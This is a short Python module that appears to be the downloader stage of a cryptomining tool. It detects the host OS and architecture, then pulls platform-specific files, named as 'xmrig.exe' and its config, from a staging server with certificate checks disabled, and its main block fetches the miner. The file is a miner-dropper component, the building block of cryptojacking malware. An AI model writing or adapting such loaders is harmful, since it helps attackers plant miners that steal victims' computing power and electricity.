import requests
import platform
from lib.TempManager import TempManager


class Downloader:
    URL = "http://localhost:8080"
    NAMESPACE = "/"
    MINER_PATH = "xmrig.exe"
    CONFIG_PATH = "config.json"
    CHUNK_SIZE = 1024

    def __init__(self, CHUNK_SIZE = None):
        if CHUNK_SIZE: self.CHUNK_SIZE = CHUNK_SIZE

        NAMESPACE_MAP = {
            "WINDOWS": "W",
            "LINUX": "L",
            "DARWIN": "D"
        }

        self.NAMESPACE = f"/{NAMESPACE_MAP[platform.system().upper()]}{platform.architecture()[0][:2]}/"
    
    def _download(self, file:str) -> str:
        filepath = TempManager.get_path(file)

        r = requests.get(self.URL + self.NAMESPACE + file, stream=True, timeout=30, verify=False)
        f = TempManager.open_file(filepath, 'wb')

        for chunk in r.iter_content(self.CHUNK_SIZE):
            if chunk:
                f.write(chunk)
        
        f.close()
        return filepath



if __name__ == "__main__":
    dd = Downloader()
    dd._download(dd.MINER_PATH)